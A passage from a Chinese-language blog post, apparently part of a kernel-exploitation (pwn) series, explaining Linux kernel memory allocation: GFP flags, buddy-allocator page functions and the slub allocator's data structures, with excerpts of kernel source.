<li><code>GFP_KERNEL(__GFP_RECLAIM | __GFP_IO | __GFP_FS)</code>：内核分配内存常用的标志之一。它可能会被阻塞，即分配过程中可能会睡眠</li>
<li><code>GFP_ATOMIC(__GFP_HIGH|__GFP_ATOMIC|__GFP_KSWAPD_RECLAIM)</code>：调用者不能睡眠并且保证分配会成功。它可以访问系统预留的内存</li>
<li><code>GFP_NOWAIT(__GFP_KSWAPD_RECLAIM)</code>：分配中不允许睡眠等待</li>
<li><code>GFP_NOFS(__GFP_RECLAIM | __GFP_IO)</code>：不会访问任何的文件系统的接口和操作</li>
<li><code>GFP_NOIO(__GFP_RECLAIM)</code>：不需要启动任何的 I&#x2F;O 操作。如使用直接回收机制丢弃干净的页面或者为 slab 分配的页面</li>
<li><code>GFP_USER(__GFP_RECLAIM | __GFP_IO | __GFP_FS | __GFP_HARDWALL)</code>：通常用户空间的进程用来分配内存，这些内存可以被内核或者硬件使用。常用的、一个场景是硬件使用的 DMA 缓冲器要映射到用户空间，如显卡的缓冲器</li>
<li><code>GFP_DMA/GFP_DMA32(__GFP_DMA/__GFP_DMA32)</code>：使用 <code>ZONE_DMA</code> 或者 <code>ZONE_DMA32</code> 来分配内存</li>
<li><code>GFP_HIGHUSER(GFP_USER | __GFP_HIGHMEM)</code>：用户空间进程用来分配内存，优先使用 <code>ZONE_HIGHMEM</code> ，这些内存可以映射到用户空间，内核空间不会直接访问这些内存。另外，这些内存不能迁移</li>
<li><code>GFP_HIGHUSER_MOVABLE(GFP_HIGHUSER | __GFP_MOVABLE)</code>：类似于 <code>GFP_HIGHUSER</code> ，但是页面可以迁移</li>
<li><code>GFP_TRANSHUGE/GFP_TRANSHUGE_LIGHT((GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM)/((GFP_HIGHUSER_MOVABLE | __GFP_COMP |  __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM))</code>：通常用于透明页面分配</li>
</ul>
<blockquote>
<p>这些符号的定义保存在源码&#x2F;source&#x2F;include&#x2F;linux&#x2F;gfp.h 里面。</p>
</blockquote>
<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p><strong>分配物理页面</strong></p>
<ul>
<li><p><code>alloc_pages</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> page *<span class="title function_">alloc_pages</span><span class="params">(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order)</span>;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><code>alloc_pages()</code> 函数用来分配2^order个连续的物理页面，返回值是第一个物理页面的 <code>page</code> 数据结构。第一个参数是 <code>gfp_mask</code>；第二个参数是 <code>order</code> ，请求的 <code>order</code> 需要小于 <code>MAX_ORDER</code> ，<code>MAX_ORDER</code> 通常默认是 11 。</p>
</li>
<li><p><code>__get_free_pages</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __get_free_pages(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order);</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><code>_get_free_pages()</code> 函数返回的是所分配内存的内核空间虚拟地址。如果所分配内存是线性映射的物理内存，则直接返回线性映射区域的内核空间虚拟地址；<code>_get_free _pages()</code> 函数不会使用高端内存，如果一定需要使用高端内存，最佳的办法是使用 <code>alloc_pages()</code> 函数以及 <code>kmap()</code> 函数。注意，在 64 位处理器的 Linux 内核中没有高端内存这个概念，它只实现在 32 位处理器的Linux内核中。</p>
</li>
<li><p>分配一个物理页面<br>如果需要分配一个物理页面，可以使用如下两个封装好的接口函数，它们最后仍调用 <code>alloc_pages()</code> ，只是 <code>order</code> 的值为 0 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> alloc_page(gfp_mask) alloc_pages(gfp_mask, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __get_free_page(gfp_mask) \</span></span><br><span class="line"><span class="meta">		__get_free_pages((gfp_mask), 0)</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure></div>

<p>如果需要返回一个全填充为 0 的页面，可以使用如下接口函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">get_zeroed_page</span><span class="params">(<span class="type">gfp_t</span> gfp_mask)</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>释放页面</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __free_pages(<span class="keyword">struct</span> page *page, <span class="type">unsigned</span> <span class="type">int</span> order);</span><br><span class="line"><span class="type">void</span> <span class="title function_">free_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">int</span> order)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __free_page(page) __free_pages((page), 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> free_page(addr) free_pages((addr), 0)</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure></div>

<p>释放时需要特别注意参数，传递错误的 <code>page</code> 指针或者错误的 <code>order</code> 值会引起系统崩溃。<code>free pages()</code> 函数的第一个参数是待释放页面的 <code>page</code> 指针，第二个参数是 <code>order</code> 。 <code>__free _page()</code> 函数用于释放单个页面。</p>
<h4 id="slub"><a href="#slub" class="headerlink" title="slub"></a>slub</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/slub_allocator.png"
                      alt="slub_allocator"
                ></p>
<h5 id="相关数据结构-1"><a href="#相关数据结构-1" class="headerlink" title="相关数据结构"></a>相关数据结构</h5><p><code>kmem_cache</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 每个 CPU 的内存缓存的抽象 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">	<span class="type">slab_flags_t</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line">    <span class="comment">/* 每个对象本身元数据及包括对齐信息后所占据的内存长度 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;	<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">    <span class="comment">/* 每个对象本身元数据所占用的内存长度，创建 kmem_cache 时候传递进来的参数 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset;	<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">    <span class="comment">/* 本地缓存池的空闲对象门槛值，超过这个值，就需要做释放动作 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* 存放最优 slab 的阶数和对象数量。高16bit 是 slab 阶数，低 16bit 是 slab 中包含的对象数量 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">    <span class="comment">/* 理论存放最大slab的阶数和对象数量，存放格式与 oo 一致。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">    <span class="comment">/* 存放最小 slab 的阶数和对象数量，存放格式与 oo 一致。最优 slab 方案无法实现，那么就会尝试最小 slab 的方案 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="type">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">    <span class="comment">/* 表示 kmem_cache 是否处于使用状态 */</span></span><br><span class="line">	<span class="type">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>kmem_cache_cpu</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 指向下一个可用的 object */</span></span><br><span class="line">	<span class="type">void</span> **freelist;	<span class="comment">/* Pointer to next available object */</span></span><br><span class="line">    <span class="comment">/* 用于做内核同步的 ID */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> tid;	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">    <span class="comment">/* 当前 CPU 正在访问的 slab 的首页 page 的地址 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *	<span class="title">page</span>;</span>	<span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="comment">/* 本地 slab 部分空闲链表 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span>	<span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">	<span class="type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>kmem_cache_node</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 自旋锁 */</span></span><br><span class="line">	<span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">    <span class="comment">/* 当前内存节点所包含 slab 的数量 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line">    <span class="comment">/* 内存节点的 slab partial 链表，slub 对共享缓存，只用一条部分空闲链表管理 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line">	<span class="type">atomic_long_t</span> total_objects;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>slab 以页为基本单位切割，然后用单向链表(fd指针)串起来，类似用户态堆的 fastbin，每一个小块我们叫它 object 。</p>
<p><strong>注意：object 的 freelist 指针偏移是 kmem_cache.offset 而不是 0，虽然大多数情况 kmem_cache.offset 默认为 0 。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>object</code> 结构如下图所示：<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/80fbfc5452e6ee425f7676a492aef25a.png"
                      alt="在这里插入图片描述"
                ></p>
<h5 id="kmem-cache-创建"><a href="#kmem-cache-创建" class="headerlink" title="kmem_cache 创建"></a>kmem_cache 创建</h5><p>slub 分配器把伙伴系统提供的内存内存切割成特定大小的块，进行内核的小内存分配。</p>
<p>具体来说，内核会预先定义一些 <code>kmem_cache</code> 结构体，它保存着要如何分割使用内存页的信息，可以通过 <code>cat /proc/slabinfo</code> 查看系统当前可用的 <code>kmem_cache</code> 。</p>
<p>内核很多的结构体会频繁的申请和释放内存，用 <code>kmem_cache</code> 来管理特定的结构体所需要申请的内存效率上就会比较高，也比较节省内存。默认会创建 <code>kmalloc-8k</code> ，<code>kmalloc-4k</code>，… ，<code>kmalloc-16</code> ，<code>kmalloc-8</code> 这样的 cache ，<code>kmem_cache</code> 的名称以及大小使用 <code>struct kmalloc_info_struct</code> 管理。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123; </span><br><span class="line">    &#123;<span class="literal">NULL</span>,                      <span class="number">0</span>&#125;,     &#123;<span class="string">&quot;kmalloc-96&quot;</span>,             <span class="number">96</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-192&quot;</span>,           <span class="number">192</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8&quot;</span>,               <span class="number">8</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16&quot;</span>,             <span class="number">16</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32&quot;</span>,             <span class="number">32</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-64&quot;</span>,             <span class="number">64</span>&#125;,     &#123;<span class="string">&quot;kmalloc-128&quot;</span>,           <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-256&quot;</span>,           <span class="number">256</span>&#125;,     &#123;<span class="string">&quot;kmalloc-512&quot;</span>,           <span class="number">512</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1024&quot;</span>,         <span class="number">1024</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2048&quot;</span>,         <span class="number">2048</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4096&quot;</span>,         <span class="number">4096</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8192&quot;</span>,         <span class="number">8192</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16384&quot;</span>,       <span class="number">16384</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32768&quot;</span>,       <span class="number">32768</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-65536&quot;</span>,       <span class="number">65536</span>&#125;,     &#123;<span class="string">&quot;kmalloc-131072&quot;</span>,     <span class="number">131072</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-262144&quot;</span>,     <span class="number">262144</span>&#125;,     &#123;<span class="string">&quot;kmalloc-524288&quot;</span>,     <span class="number">524288</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1048576&quot;</span>,   <span class="number">1048576</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2097152&quot;</span>,   <span class="number">2097152</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4194304&quot;</span>,   <span class="number">4194304</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8388608&quot;</span>,   <span class="number">8388608</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16777216&quot;</span>, <span class="number">16777216</span>&#125;,     &#123;<span class="string">&quot;kmalloc-33554432&quot;</span>, <span class="number">33554432</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-67108864&quot;</span>, <span class="number">67108864</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这样内核调用 <code>kmalloc</code> 函数时就可以根据申请的内存大小找到对应的 <code>kmalloc-xx</code> ，然后在里面找可可用的内存块。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">kmalloc_index</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!size)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line">        <span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">4</span> * <span 